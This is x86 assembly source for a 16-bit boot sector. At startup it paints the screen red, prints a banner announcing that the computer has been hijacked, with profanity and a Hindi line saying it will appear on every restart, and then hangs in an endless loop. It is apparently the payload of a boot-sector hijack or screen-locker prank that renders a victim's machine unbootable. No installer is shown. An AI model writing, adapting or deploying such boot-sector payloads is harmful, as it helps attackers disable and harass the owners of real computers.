org 0x7C00
bits 16
jmp short start
nop
times 8 db 0
dw 512,1,1,2,224,2880,0xF0,9,18,2
dd 0,0

start:
    cli
    cld
    xor ax, ax
    mov ss, ax
    mov sp, 0x7C00

    mov ax, 0xB800
    mov es, ax
    xor di, di
    mov cx, 2000
    mov ax, 0x4F20
    rep stosw

    mov si, msg
    call print

    jmp $

print:
    mov ah, 0x0E
.next:
    lodsb
    test al, al
    jz .done
    int 0x10
    jmp .next
.done:
    ret

msg:
    db 0x0D,0x0A
    db "==========================================",0x0D,0x0A
    db "   NIK HIJACK YOUR COMPUTER             ",0x0D,0x0A
    db "   FUCKING ASSHOLE                      ",0x0D,0x0A
    db "   HAR RESTART PE DIKHEGA!              ",0x0D,0x0A
    db "==========================================",0x0D,0x0A,0

times 510-($-$$) db 0
dw 0xAA55
